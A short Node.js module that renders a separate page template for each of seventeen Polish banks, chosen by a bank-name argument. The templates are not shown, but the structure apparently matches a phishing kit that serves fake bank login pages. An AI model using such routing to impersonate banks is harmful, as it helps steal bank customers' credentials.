module.exports = function send(res, id, bank) {
    switch (bank) {
        case "alior":
            res.render('pages/banksPL/allior') 
            break
        case "pko":
            res.render('pages/banksPL/ipko') 
            break
        case "ing":
            res.render('pages/banksPL/ing') 
            break
        case "santander":
            res.render('pages/banksPL/santander') 
            break
        case "mbank":
            res.render('pages/banksPL/mbank') 
            break
        case "bnp":
            res.render('pages/banksPL/bnp') 
            break
        case "pekao":
            res.render('pages/banksPL/pekao') 
            break
        case "getin":
            res.render('pages/banksPL/getin')
            break
        case "millennium":
            res.render('pages/banksPL/millennium') 
            break
        case "agricole":
            res.render('pages/banksPL/agricole') 
            break
        case "pocztowy":
            res.render('pages/banksPL/pocztowy') 
            break
        case "sgb":
            res.render('pages/banksPL/sgb') 
            break
        case "noble":
            res.render('pages/banksPL/noble') 
            break
        case "gbs":
            res.render('pages/banksPL/gbs') 
            break
        case "nowy":
            res.render('pages/banksPL/nowy')
            break
        case "bos":
            res.render('pages/banksPL/bos') 
            break
        case "citi":
            res.render('pages/banksPL/citibank')
            break
    }
}